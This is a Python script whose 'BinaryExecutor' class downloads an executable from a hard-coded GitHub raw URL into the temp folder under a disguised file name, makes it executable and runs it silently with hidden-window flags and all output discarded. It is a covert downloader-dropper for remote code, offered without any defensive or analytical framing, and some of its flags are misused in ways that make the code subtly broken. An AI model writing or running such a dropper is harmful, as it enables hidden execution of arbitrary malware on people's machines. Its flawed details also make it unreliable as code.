import os
import sys
import hashlib
import requests
import tempfile
import subprocess
import platform

class BinaryExecutor:
    def __init__(self):
        self.target_url = "https://raw.githubusercontent.com/maheswede/min/main/aur.exe"  # REPLACE WITH ACTUAL CDN
        self.env_hash = hashlib.sha256(str(os.environ).encode()).hexdigest()[:8]
        self.os_type = platform.system()
        self._setup_paths()

    def _setup_paths(self):
        self.temp_dir = tempfile.gettempdir()
        self.binary_name = f"tf_{self.env_hash}.bin"
        if self.os_type == "Windows":
            self.binary_name += ".exe"
        self.full_path = os.path.join(self.temp_dir, self.binary_name)

    def _download_binary(self):
        try:
            resp = requests.get(self.target_url, stream=True, timeout=15)
            with open(self.full_path, "wb") as f:
                for chunk in resp.iter_content(chunk_size=8192):
                    f.write(chunk)
            os.chmod(self.full_path, 0o755)
        except Exception as e:
            sys.stderr.write(f"Binary fetch failed: {str(e)}")
            sys.exit(1)

    def _execute_silently(self):
        creationflags = 0
        if self.os_type == "Windows":
            creationflags = subprocess.CREATE_NO_WINDOW | subprocess.SW_HIDE
        elif self.os_type == "Linux":
            creationflags = subprocess.DETACHED_PROCESS
        subprocess.Popen(
            [self.full_path],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            stdin=subprocess.DEVNULL,
            creationflags=creationflags
        )

    def run(self):
        if not os.path.exists(self.full_path):
            self._download_binary()
        self._execute_silently()